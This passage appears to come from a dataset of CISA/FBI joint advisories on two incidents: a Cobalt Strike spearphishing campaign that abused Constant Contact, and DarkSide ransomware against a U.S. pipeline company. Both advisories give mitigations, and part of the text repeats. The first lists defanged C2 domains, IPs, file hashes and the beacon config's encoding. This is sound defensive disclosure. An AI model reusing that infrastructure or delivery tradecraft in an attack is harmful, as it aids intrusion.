Volexity Blog: Suspected APT29 Operation Launches Election Fraud Themed Phishing Campaigns | Volexity
Microsoft Blog: New sophisticated email-based attack from NOBELIUM - Microsoft Security
Microsoft Blog: Another Nobelium Cyberattack


Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at central@cisa.dhs.gov.
This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/.
 

References

[1] Microsoft Blog: New Sophisticated Email-Based Attack from NOBELIUM
[2] Ibid.
Volexity Blog: Suspected APT29 Operation Launches Election Fraud Themed Phishing Campaigns
[4] MITRE ATT&CK: Cobalt Strike

Revisions

May 28, 2021: Initial version|May 29, 2021: Added final sentence of first paragraph in Summary section






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1566.002', 'T1105', 'TA0011', 'T1055.001', 'T1204.001'}","




Summary

This Joint Cybersecurity Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Version 9. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) are engaged in addressing a spearphishing campaign targeting government organizations, intergovernmental organizations (IGOs), and non-governmental organizations (NGOs). A sophisticated cyber threat actor leveraged a compromised end-user account from Constant Contact, a legitimate email marketing software company, to spoof a U.S.-based government organization and distribute links to malicious URLs.,1, CISA and FBI have not determined that any individual accounts have been specifically targeted by this campaign.
Note: CISA and FBI acknowledge open-source reporting attributing the activity discussed in the report to APT29 (also known as Nobelium, The Dukes, and Cozy Bear).,2,3, However, CISA and FBI are investigating this activity and have not attributed it to any threat actor at this time. CISA and FBI will update this Joint Cybersecurity Advisory as new information becomes available. Note:
This Joint Cybersecurity Advisory contains information on tactics, techniques, and procedures (TTPs) and malware associated with this campaign. For more information on the malware, refer to Malware Analysis Report MAR-10339794-1.v1: Cobalt Strike Beacon.
CISA and FBI urge governmental and international affairs organizations and individuals associated with such organizations to adopt a heightened state of awareness and implement the recommendations in the Mitigations section of this advisory.
For a downloadable list of indicators of compromise (IOCs), refer to AA21-148A.stix, and MAR-10339794-1.v1.stix.
Click here for a PDF version of this report.

Technical Details

Based on incident reports, malware collection, and trusted third-party reporting, CISA and FBI are engaged in addressing a sophisticated spearphishing campaign. A cyber threat actor leveraged a compromised end-user account from Constant Contact, a legitimate email marketing software company, to send phishing emails to more than 7,000 accounts across approximately 350 government organizations, IGOs, and NGOs. The threat actor sent spoofed emails that appeared to originate from a U.S. Government organization. The emails contained a legitimate Constant Contact link that redirected to a malicious URL, from which a malicious ISO file was dropped onto the victim’s machine.
The ISO file contained (1) a malicious Dynamic Link Library (DLL) named Documents.dll, which is a custom Cobalt Strike Beacon version 4 implant, (2) a malicious shortcut file that executes the Cobalt Strike Beacon loader, and (3) a benign decoy PDF titled “Foreign Threats to the 2020 US Federal Elections” with file name “ICA-declass.pdf” (see figure 1). Note: The decoy file appears to be a copy of the declassified Intelligence Community Assessment pursuant to Executive Order 13848 Section 1(a), which is available at https://www.intelligence.gov/index.php/ic-on-the-record-database/results/1046-foreign-threats-to-the-2020-us-federal-elections-intelligence-community-assessment.

Figure 1: Decoy PDF: ICA-declass.pdf
Cobalt Strike is a commercial penetration testing tool used to conduct red team operations.,4, It contains a number of tools that complement the cyber threat actor’s exploitation efforts, such as a keystroke logger, file injection capability, and network services scanners. The Cobalt Strike Beacon is the malicious implant that calls back to attacker-controlled infrastructure and checks for additional commands to execute on the compromised system,.
The configuration file for this Cobalt Strike Beacon implant contained communications protocols, an implant watermark, and the following hardcoded command and control (C2) domains:

dataplane.theyardservice,.,com/jquery-3.3.1.min.woff2
cdn.theyardservice,.,com/jquery-3.3.1.min.woff2
static.theyardservice,.,com/jquery-3.3.1.min.woff2
worldhomeoutlet,.,com/jquery-3.3.1.min.woff2

The configuration file was encoded via an XOR with the key 0x2e and a 16-bit byte swap.
For more information on the ISO file and Cobalt Strike Beacon implant, including IOCs, refer to Malware Analysis Report MAR-10339794-1.v1: Cobalt Strike Beacon.
Indicators of Compromise
The following IOCS were derived from trusted third parties and open-source research. For a downloadable list of IOCs, refer to AA21-148A.stix and MAR-10339794-1.v1.stix.

URL: https,:,//r20.rs6.net/tn.jsp?f=
Host IP: 208.75.122,.,11 (US)
Owner: Constant Contact, Inc.
Activity: legitimate Constant Contact link found in phishing email that redirects victims to actor-controlled infrastructure at https,:,//usaid.theyardservice.com/d/<target_email_address>
	 
URL: https,:,//usaid.theyardservice.com/d/<target_email_address>
Host IP: 83.171.237,.,173 (Germany)
Owner:,redacted,
First Seen: May 25, 2021
Activity: actor-controlled URL that was redirected from https,:,//r20.rs6.net/tn.jsp?f=; the domain usaid,.,theyardservice.com was detected as a malware site; hosted a malicious ISO file ""usaid,.,theyardservice.com""
	 
File: ICA-declass.iso,MD5: cbc1dc536cd6f4fb9648e229e5d23361,
File Type: Macintosh Disk Image
Detection: Artemis!7EDF943ED251, Trojan:Win32/Cobaltstrike!MSR, or other malware
Activity: ISO file container; contains a custom Cobalt Strike Beacon loader; communicated with multiple URLs, domains, and IP addresses
	 
File: /d/,MD5: ebe2f8df39b4a94fb408580a728d351f,
File Type: Macintosh Disk Image
Detection: Cobalt, Artemis!7EDF943ED251, or other malware
Activity: ISO file container; contains a custom Cobalt Strike Beacon loader; communicated with multiple URLs, domains, and IP addresses
	 
File: ICA-declass.iso,MD5: 29e2ef8ef5c6ff95e98bff095e63dc05,
File Type: Macintosh Disk Image
Detection: Cobalt Strike, Rozena, or other malware
Activity: ISO file container; contains a custom Cobalt Strike Beacon loader; communicated with multiple URLs, domains, and IP addresses
	 
File: Reports.lnk,MD5: dcfd60883c73c3d92fceb6ac910d5b80,
File Type: LNK (Windows shortcut)
Detection: Worm: Win32-Script.Save.df8efe7a, Static AI - Suspicious LNK, or other malware
Activity: shortcut contained in malicious ISO files; executes a custom Cobalt Strike Beacon loader
	 
File: ICA-declass.pdf,MD5: b40b30329489d342b2aa5ef8309ad388,
File Type: PDF
Detection: undetected
Activity: benign, password-protected PDF displayed to victim as a decoy; currently unrecognized by antivirus software
	 
File: DOCUMENT.DLL,MD5: 7edf943ed251fa480c5ca5abb2446c75,
File Type: Win32 DLL
Detection: Trojan: Win32/Cobaltstrike!MSR, Rozena, or other malware
Activity: custom Cobalt Strike Beacon loader contained in malicious ISO files; communicating with multiple URLs, domains, and IP addresses by antivirus software
	 
File: DOCUMENT.DLL,MD5: 1c3b8ae594cb4ce24c2680b47cebf808,
File Type: Win32 DLL
Detection: Cobalt Strike, Razy, Khalesi, or other malware
Activity: Custom Cobalt Strike Beacon loader contained in malicious ISO files; communicating with multiple URLs, domains, and IP addresses by antivirus software
	 
Domain: usaid,.,theyardservice.com
Host IP: 83.171.237,.,173 (Germany)
First Seen: May 25, 2021
Owner: Withheld for Privacy Purposes
Activity: subdomain used to distribute ISO file according to the trusted third party; detected as a malware site by antivirus programs
	 
Domain: worldhomeoutlet.com
Host IP: 192.99.221,.,77 (Canada)
Created Date: March 11, 2020
Owner: Withheld for Privacy Purposes by Registrar
Activity: Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software; associated with Cobalt Strike malware
	 
Domain: dataplane.theyardservice,.,com
Host IP: 83.171.237,.,173 (Germany)
First Seen: May 25, 2021
Owner:,redacted,
Activity: Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software; observed in phishing, malware, and spam activity
	 
Domain: cdn.theyardservice,.,com
Host IP: 83.171.237,.,173 (Germany)
First Seen: May 25, 2021
Owner: Withheld for Privacy Purposes by Registrar
Activity: Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software
	 
Domain: static.theyardservice,.,com
Host IP: 83.171.237,.,173 (Germany)
First Seen: May 25, 2021
Owner: Withheld for Privacy Purposes
Activity: Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software
	 
IP: 192.99.221,.,77
Organization: OVH SAS
Resolutions: 7
Geolocation: Canada
Activity: detected as a malware site; hosts a suspicious domain worldhomeoutlet,.,com; observed in Cobalt Strike activity
	 
IP: 83.171.237,.,173
Organization: Droptop GmbH
Resolutions: 15
Geolocation: Germany
Activity: Categorized as malicious by antivirus software; hosted multiple suspicious domains and multiple malicious files were observed downloaded from this IP address; observed in Cobalt Strike and activity
	 
Domain: theyardservice,.,com
Host IP: 83.171.237,.,173 (Germany)
Created Date: January 27, 2010
Owner: Withheld for Privacy Purposes
Activity: Threat actor controlled domain according to the trusted third party; categorized as suspicious by antivirus software; observed in Cobalt Strike activity

Table 1 provides a summary of the MITRE ATT&CK techniques observed.
Table 1: MITRE ATT&CK techniques observed


Mitigations

CISA and FBI urge CI owners and operators to apply the following mitigations.

Implement multi-factor authentication (MFA) for every account. While privileged accounts and remote access systems are critical, it is also important to ensure full coverage across SaaS solutions. Enabling MFA for corporate communications platforms (as with all other accounts) provides vital defense against these types of attacks and, in many cases, can prevent them.
Keep all software up to date. The most effective cybersecurity programs quickly update all of their software as soon as patches are available. If your organization is unable to update all software shortly after a patch is released, prioritize implementing patches for CVEs that are already known to be exploited.
Implement endpoint and detection response (EDR) tools. EDR allows a high degree of visibility into the security status of endpoints and is can be an effective tool against threat actors.
Note: Organizations using Microsoft Defender for Endpoint or Microsoft 365 Defense should refer to Microsoft: Use attack surface reduction rules to prevent malware infection for more information on hardening the enterprise attack surface.
Implement centralized log management for host monitoring. A centralized logging application allows technicians to look out for anomalous activity in the network environment, such as new applications running on hosts, out-of-place communication between devices, or unaccountable login failures on machines. It also aids in troubleshooting applications or equipment in the event of a fault. CISA and the FBI recommend that organizations:

Forward logs from local hosts to a centralized log management server—often referred to as a security information and event management (SIEM) tool.
Ensure logs are searchable. The ability to search, analyze, and visualize communications will help analysts diagnose issues and may lead to detection of anomalous activity.
Correlate logs from both network and host security devices. By reviewing logs from multiple sources, an organization can better triage an individual event and determine its impact to the organization as a whole.
Review both centralized and local log management policies to maximize efficiency and retain historical data. Organizations should retain critical logs for a minimum of 30 days.


Deploy signatures to detect and/or block inbound connection from Cobalt Strike servers and other post-exploitation tools.
Implement unauthorized execution prevention by disabling macro scripts from Microsoft Office files transmitted via email. Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Microsoft Office suite applications.
Configure and maintain user and administrative accounts using a strong account management policy.

Use administrative accounts on dedicated administration workstations.
Limit access to and use of administrative accounts.
Use strong passwords. For more information on strong passwords, refer to CISA Tip: Choosing and Protecting Passwords and National Institute of Standards (NIST) SP 800-63: Digital Identity Guidelines: Authentication and Lifecycle Management.
Remove default accounts if unneeded. Change the password of default accounts that are needed.
Disable all unused accounts.


Implement a user training program and simulated attacks for spearphishing to discourage users from visiting malicious websites or opening malicious attachments and re-enforce the appropriate user responses to spearphishing emails.

RESOURCES

Volexity Blog: Suspected APT29 Operation Launches Election Fraud Themed Phishing Campaigns | Volexity
Microsoft Blog: New sophisticated email-based attack from NOBELIUM - Microsoft Security
Microsoft Blog: Another Nobelium Cyberattack


Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at central@cisa.dhs.gov.
This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/.
 

References,1, Microsoft Blog: New Sophisticated Email-Based Attack from NOBELIUM,2, Ibid.
Volexity Blog: Suspected APT29 Operation Launches Election Fraud Themed Phishing Campaigns,4, MITRE ATT&CK: Cobalt Strike

Revisions

May 28, 2021: Initial version|May 29, 2021: Added final sentence of first paragraph in Summary section






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-148a
65,"




Summary

This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Version 9. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) are aware of a ransomware attack affecting a critical infrastructure (CI) entity—a pipeline company—in the United States. Malicious cyber actors deployed DarkSide ransomware against the pipeline company’s information technology (IT) network.[1] At this time, there is no indication that the entity’s operational technology (OT) networks have been directly affected by the ransomware.
CISA and FBI urge CI asset owners and operators to adopt a heightened state of awareness and implement the recommendations listed in the Mitigations section of this Joint Cybersecurity Advisory, including implementing robust network segmentation between IT and OT networks; regularly testing manual controls; and ensuring that backups are implemented, regularly tested, and isolated from network connections. These mitigations will help CI owners and operators improve their entity's functional resilience by reducing their vulnerability to ransomware and the risk of severe business degradation if impacted by ransomware.

(Updated May 19, 2021): Click here for a STIX package of indicators of compromise (IOCs). Note: These IOCs were shared with critical infrastructure partners and network defenders on May 10, 2021. The applications listed in the IOCs were leveraged by the threat actors during the course of a compromise. Some of these applications might appear within an organization's enterprise to support legitimate purposes; however, these applications can be used by threat actors to aid in malicious exploitation of an organization's enterprise. CISA and FBI recommend removing any application not deemed necessary for day-to-day operations.
(Updated July 08, 2021): Click here for downloadable IOCs associated with a sample of a DarkSide ransomware variant analyzed by CISA and FBI. Note: CISA and FBI have no evidence that this sample is related to the pipeline incident detailed in this CSA. This variant executes a dynamic-link library (DLL) program used to delete Volume Shadow copies available on the system. The malware collects, encrypts, and sends system information to the threat actor’s command and control (C2) domains and generates a ransom note to the victim. For more information about this variant, refer to Malware Analysis Report MAR-10337802-1.v1: DarkSide Ransomware. 

Click here for a PDF version of this report.

Technical Details

Note: the analysis in this Joint Cybersecurity Advisory is ongoing, and the information provided should not be considered comprehensive. CISA and FBI will update this advisory as new information is available.
After gaining initial access to the pipeline company’s network, DarkSide actors deployed DarkSide ransomware against the company’s IT network. In response to the cyberattack, the company has reported that they proactively disconnected certain OT systems to ensure the systems’ safety.[2] At this time, there are no indications that the threat actor moved laterally to OT systems.
DarkSide is ransomware-as-a-service (RaaS)—the developers of the ransomware receive a share of the proceeds from the cybercriminal actors who deploy it, known as “affiliates.” According to open-source reporting, since August 2020, DarkSide actors have been targeting multiple large, high-revenue organizations, resulting in the encryption and theft of sensitive data. The DarkSide group has publicly stated that they prefer to target organizations that can afford to pay large ransoms instead of hospitals, schools, non-profits, and governments.[3],[4]
According to open-source reporting, DarkSide actors have previously been observed gaining initial access through phishing and exploiting remotely accessible accounts and systems and Virtual Desktop Infrastructure (VDI) (Phishing [T1566], Exploit Public-Facing Application [T1190], External Remote Services [T1133]).[5],[6] DarkSide actors have also been observed using Remote Desktop Protocol (RDP) to maintain Persistence [TA0003].[7]
After gaining access, DarkSide actors deploy DarkSide ransomware to encrypt and steal sensitive data (Data Encrypted for Impact [T1486]). The actors then threaten to publicly release the data if the ransom is not paid.[8],[9] The DarkSide ransomware uses Salsa20 and RSA encryption.[10]
DarkSide actors primarily use The Onion Router (TOR) for Command and Control (C2) [TA0011] (Proxy: Multi-hop Proxy [1090.003]).[11],[12] The actors have also been observed using Cobalt Strike for C2.[13]

Mitigations

CISA and FBI urge CI owners and operators to apply the following mitigations to reduce the risk of compromise by ransomware attacks.

Require multi-factor authentication for remote access to OT and IT networks.
Enable strong spam filters to prevent phishing emails from reaching end users. Filter emails containing executable files from reaching end users.
Implement a user training program and simulated attacks for spearphishing to discourage users from visiting malicious websites or opening malicious attachments and re-enforce the appropriate user responses to spearphishing emails.
Filter network traffic to prohibit ingress and egress communications with known malicious IP addresses. Prevent users from accessing malicious websites by implementing URL blocklists and/or allowlists.
Update software, including operating systems, applications, and firmware on IT network assets, in a timely manner. Consider using a centralized patch management system; use a risk-based assessment strategy to determine which OT network assets and zones should participate in the patch management program.
Limit access to resources over networks, especially by restricting RDP. After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources and require multi-factor authentication.
Set antivirus/antimalware programs to conduct regular scans of IT network assets using up-to-date signatures. Use a risk-based asset inventory strategy to determine how OT network assets are identified and evaluated for the presence of malware.
Implement unauthorized execution prevention by: 

Disabling macro scripts from Microsoft Office files transmitted via email. Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Microsoft Office suite applications.
Implementing application allowlisting, which only allows systems to execute programs known and permitted by security policy. Implement software restriction policies (SRPs) or other controls to prevent programs from executing from common ransomware locations, such as temporary folders supporting popular internet browsers or compression/decompression programs, including the AppData/LocalAppData folder.
Monitor and/or block inbound connections from Tor exit nodes and other anonymization services to IP addresses and ports for which external connections are not expected (i.e., other than VPN gateways, mail ports, web ports). For more guidance, refer to Joint Cybersecurity Advisory AA20-183A: Defending Against Malicious Cyber Activity Originating from Tor.
Deploy signatures to detect and/or block inbound connection from Cobalt Strike servers and other post exploitation tools.



CISA and FBI urge CI owners and operators to apply the following mitigations now to reduce the risk of severe business or functional degradation should their CI entity fall victim to a ransomware attack in the future.

Implement and ensure robust network segmentation between IT and OT networks to limit the ability of adversaries to pivot to the OT network even if the IT network is compromised. Define a demilitarized zone that eliminates unregulated communication between the IT and OT networks.
Organize OT assets into logical zones by taking into account criticality, consequence, and operational necessity. Define acceptable communication conduits between the zones and deploy security controls to filter network traffic and monitor communications between zones. Prohibit industrial control system (ICS) protocols from traversing the IT network.
Identify OT and IT network inter-dependencies and develop workarounds or manual controls to ensure ICS networks can be isolated if the connections create risk to the safe and reliable operation of OT processes. Regularly test contingency plans such as manual controls so that safety critical functions can be maintained during a cyber incident. Ensure that the OT network can operate at necessary capacity even if the IT network is compromised. 
Regularly test manual controls so that critical functions can be kept running if ICS or OT networks need to be taken offline.
Implement regular data backup procedures on both the IT and OT networks. Backup procedures should be conducted on a frequent, regular basis. The data backup procedures should also address the following best practices:

Ensure that backups are regularly tested.
Store your backups separately. Backups should be isolated from network connections that could enable the spread of ransomware. It is important that backups be maintained offline as many ransomware variants attempt to find and encrypt or delete accessible backups. Maintaining current backups offline is critical because if your network data is encrypted with ransomware, your organization can restore systems to its previous state. Best practice is to store your backups on a separate device that cannot be accessed from a network, such as on an external hard drive. (See the Software Engineering Institute’s page on ransomware).
Maintain regularly updated “gold images” of critical systems in the event they need to be rebuilt. This entails maintaining image “templates” that include a preconfigured operating system (OS) and associated software applications that can be quickly deployed to rebuild a system, such as a virtual machine or server.
Retain backup hardware to rebuild systems in the event rebuilding the primary system is not preferred. Hardware that is newer or older than the primary system can present installation or compatibility hurdles when rebuilding from images.
Store source code or executables. It is more efficient to rebuild from system images, but some images will not install on different hardware or platforms correctly; having separate access to needed software will help in these cases.


Ensure user and process accounts are limited through account use policies, user account control, and privileged account management. Organize access rights based on the principles of least privilege and separation of duties.

If your organization is impacted by a ransomware incident, CISA and FBI recommend the following actions:

Isolate the infected system. Remove the infected system from all networks, and disable the computer’s wireless, Bluetooth, and any other potential networking capabilities. Ensure all shared and networked drives are disconnected, whether wired or wireless.  
Turn off other computers and devices. Power-off and segregate (i.e., remove from the network) the infected computer(s). Power-off and segregate any other computers or devices that shared a network with the infected computer(s) that have not been fully encrypted by ransomware. If possible, collect and secure all infected and potentially infected computers and devices in a central location, making sure to clearly label any computers that have been encrypted. Powering-off and segregating infected computers and computers that have not been fully encrypted may allow for the recovery of partially encrypted files by specialists. (See Before You Connect a New Computer to the Internet for tips on how to make a computer more secure before you reconnect it to a network.)
Secure your backups. Ensure that your backup data is offline and secure. If possible, scan your backup data with an antivirus program to check that it is free of malware.
Refer to Joint Cybersecurity Advisory: AA20-245A: Technical Approaches to Uncovering and Remediating Malicious Activity for more best practices on incident response.

Note: CISA and the FBI do not encourage paying a ransom to criminal actors. Paying a ransom may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or may fund illicit activities. Paying the ransom also does not guarantee that a victim’s files will be recovered. CISA and FBI urge you to report ransomware incidents to your local FBI field office.
CISA offers a range of no-cost cyber hygiene services to help CI organizations assess, identify and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.
Resources

CISA and MS-ISAC: Joint Ransomware Guide
CISA: Ransomware page
CISA Tip: Protecting Against Ransomware
CISA: CISA Ransomware One-Pager and Technical Document
CISA Insights: Ransomware Outbreak
CISA: Pipeline Cybersecurity Initiative
CISA Webinar: Combating Ransomware
CISA: Cybersecurity Practices for Industrial Control Systems
FBI: Incidents of Ransomware on the Rise
National Security Agency (NSA): Stop Malicious Cyber Activity Against Connected Operational Technology
Department of Energy: Oil and Natural Gas Subsector Cybersecurity Capability Maturity Model
Transportation Security Agency: Pipeline Security Guidelines
National Institute of Standards and Technology (NIST): Framework for Improving Critical Infrastructure Cybersecurity
NIST: Ransomware Protection and Response
NIST: Data Integrity: Identifying and Protecting Assets Against Ransomware and Other Destructive Events
NIST: Data Integrity: Detecting and Responding to Ransomware and Other Destructive Events
NIST: Data Integrity: Recovering from Ransomware and Other Destructive Events
NIST: Guide to Industrial Control Systems (ICS) Security
Software Engineering Institute: Ransomware: Best Practices for Prevention and Response
NIST Fact Sheet: How Do I Stay Prepared?


Contact Information

Victims of ransomware should report it immediately to CISA at https://us-cert.cisa.gov/report, a local FBI Field Office, or U.S. Secret Service Field Office. To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at central@cisa.dhs.gov.

References

[1] Colonial Pipeline Media Statement on Pipeline Disruption
[2] Ibid
[3] SonicWall: Darkside Ransomware Targets Large Corporations. Charges up to $2M.
[4] Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign
[5] BankInfo Security: FBI: DarkSide Ransomware Used in Colonial Pipeline Attack
[6] Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign
[7] Ibid
[8] SonicWall: Darkside Ransomware Targets Large Corporations. Charges up to $2M
[9] Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign
[10] McAfee: Threat Landscape Dashboard DarkSide – Ransomware
[11] SonicWall: Darkside Ransomware Targets Large Corporations. Charges up to $2M
[12] Varonis: Return of the Darkside: Analysis of a Large-Scale Data Theft Campaign
[13] McAfee: Threat Landscape Dashboard DarkSide – Ransomware

Revisions

May 11, 2021: Initial Version|May 12, 2021: Added additional resources|May 19, 2021: Added IOCs|July 8, 2021: Added MAR-10337802-1.v1 and associated IOCs






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0003', 'T1190', 'T1486', 'T1566', 'T1133', 'TA0011'}","




Summary

This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Version 9. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) are aware of a ransomware attack affecting a critical infrastructure (CI) entity—a pipeline company—in the United States. Malicious cyber actors deployed DarkSide ransomware against the pipeline company’s information technology (IT) network.,1, At this time, there is no indication that the entity’s operational technology (OT) networks have been directly affected by the ransomware.
CISA and FBI urge CI asset owners and operators to adopt a heightened state of awareness and implement the recommendations listed in the Mitigations section of this Joint Cybersecurity Advisory, including implementing robust network segmentation between IT and OT networks; regularly testing manual controls; and ensuring that backups are implemented, regularly tested, and isolated from network connections. These mitigations will help CI owners and operators improve their entity's functional resilience by reducing their vulnerability to ransomware and the risk of severe business degradation if impacted by ransomware.

(Updated May 19, 2021): Click here for a STIX package of indicators of compromise (IOCs). Note: These IOCs were shared with critical infrastructure partners and network defenders on May 10, 2021. The applications listed in the IOCs were leveraged by the threat actors during the course of a compromise. Some of these applications might appear within an organization's enterprise to support legitimate purposes; however, these applications can be used by threat actors to aid in malicious exploitation of an organization's enterprise. CISA and FBI recommend removing any application not deemed necessary for day-to-day operations.
(Updated July 08, 2021): Click here for downloadable IOCs associated with a sample of a DarkSide ransomware variant analyzed by CISA and FBI. Note: CISA and FBI have no evidence that this sample is related to the pipeline incident detailed in this CSA. This variant executes a dynamic-link library (DLL) program used to delete Volume Shadow copies available on the system. The malware collects, encrypts, and sends system information to the threat actor’s command and control (C2) domains and generates a ransom note to the victim. For more information about this variant, refer to Malware Analysis Report MAR-10337802-1.v1: DarkSide Ransomware. 

Click here for a PDF version of this report.

Technical Details

Note: the analysis in this Joint Cybersecurity Advisory is ongoing, and the information provided should not be considered comprehensive. CISA and FBI will update this advisory as new information is available.
After gaining initial access to the pipeline company’s network, DarkSide actors deployed DarkSide ransomware against the company’s IT network. In response to the cyberattack, the company has reported that they proactively disconnected certain OT systems to ensure the systems’ safety.,2, At this time, there are no indications that the threat actor moved laterally to OT systems.
DarkSide is ransomware-as-a-service (RaaS)—the developers of the ransomware receive a share of the proceeds from the cybercriminal actors who deploy it, known as “affiliates.” According to open-source reporting, since August 2020, DarkSide actors have been targeting multiple large, high-revenue organizations, resulting in the encryption and theft of sensitive data. The DarkSide group has publicly stated that they prefer to target organizations that can afford to pay large ransoms instead of hospitals, schools, non-profits, and governments.,3,4,
According to open-source reporting, DarkSide actors have previously been observed gaining initial access through phishing and exploiting remotely accessible accounts and systems and Virtual Desktop Infrastructure (VDI) (Phishing, Exploit Public-Facing Application, External Remote Services,).,5,6, DarkSide actors have also been observed using Remote Desktop Protocol (RDP) to maintain Persistence,.,7,
After gaining access, DarkSide actors deploy DarkSide ransomware to encrypt and steal sensitive data (Data Encrypted for Impact,). The actors then threaten to publicly release the data if the ransom is not paid.,8,9, The DarkSide ransomware uses Salsa20 and RSA encryption.,10,
DarkSide actors primarily use The Onion Router (TOR) for Command and Control (C2), (Proxy: Multi-hop Proxy,1090.003,).,11,12, The actors have also been observed using Cobalt Strike for C2.,13,

Mitigations

CISA and FBI urge CI owners and operators to apply the following mitigations to reduce the risk of compromise by ransomware attacks.

Require multi-factor authentication for remote access to OT and IT networks.
Enable strong spam filters to prevent phishing emails from reaching end users. Filter emails containing executable files from reaching end users.
Implement a user training program and simulated attacks for spearphishing to discourage users from visiting malicious websites or opening malicious attachments and re-enforce the appropriate user responses to spearphishing emails.
Filter network traffic to prohibit ingress and egress communications with known malicious IP addresses. Prevent users from accessing malicious websites by implementing URL blocklists and/or allowlists.
Update software, including operating systems, applications, and firmware on IT network assets, in a timely manner. Consider using a centralized patch management system; use a risk-based assessment strategy to determine which OT network assets and zones should participate in the patch management program.
Limit access to resources over networks, especially by restricting RDP. After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources and require multi-factor authentication.
Set antivirus/antimalware programs to conduct regular scans of IT network assets using up-to-date signatures. Use a risk-based asset inventory strategy to determine how OT network assets are identified and evaluated for the presence of malware.
Implement unauthorized execution prevention by: 

Disabling macro scripts from Microsoft Office files transmitted via email. Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Microsoft Office suite applications.
Implementing application allowlisting, which only allows systems to execute programs known and permitted by security policy. Implement software restriction policies (SRPs) or other controls to prevent programs from executing from common ransomware locations, such as temporary folders supporting popular internet browsers or compression/decompression programs, including the AppData/LocalAppData folder.
Monitor and/or block inbound connections from Tor exit nodes and other anonymization services to IP addresses and ports for which external connections are not expected (i.e., other than VPN gateways, mail ports, web ports). For more guidance, refer to Joint Cybersecurity Advisory AA20-183A: Defending Against Malicious Cyber Activity Originating from Tor.
Deploy signatures to detect and/or block inbound connection from Cobalt Strike servers and other post exploitation tools.



CISA and FBI urge CI owners and operators to apply the following mitigations now to reduce the risk of severe business or functional degradation should their CI entity fall victim to a ransomware attack in the future.

Implement and ensure robust network segmentation between IT and OT networks to limit the ability of adversaries to pivot to the OT network even if the IT network is compromised. Define a demilitarized zone that eliminates unregulated communication between the IT and OT networks.
Organize OT assets into logical zones by taking into account criticality, consequence, and operational necessity. Define acceptable communication conduits between the zones and deploy security controls to filter network traffic and monitor communications between zones. Prohibit industrial control system (ICS) protocols from traversing the IT network.
Identify OT and IT network inter-dependencies and develop workarounds or manual controls to ensure ICS networks can be isolated if the connections create risk to the safe and reliable operation of OT processes. Regularly test contingency plans such as manual controls so that safety critical functions can be maintained during a cyber incident. Ensure that the OT network can operate at necessary capacity even if the IT network is compromised. 
Regularly test manual controls so that critical functions can be kept running if ICS or OT networks need to be taken offline.
Implement regular data backup procedures on both the IT and OT networks. Backup procedures should be conducted on a frequent, regular basis. The data backup procedures should also address the following best practices:

Ensure that backups are regularly tested.
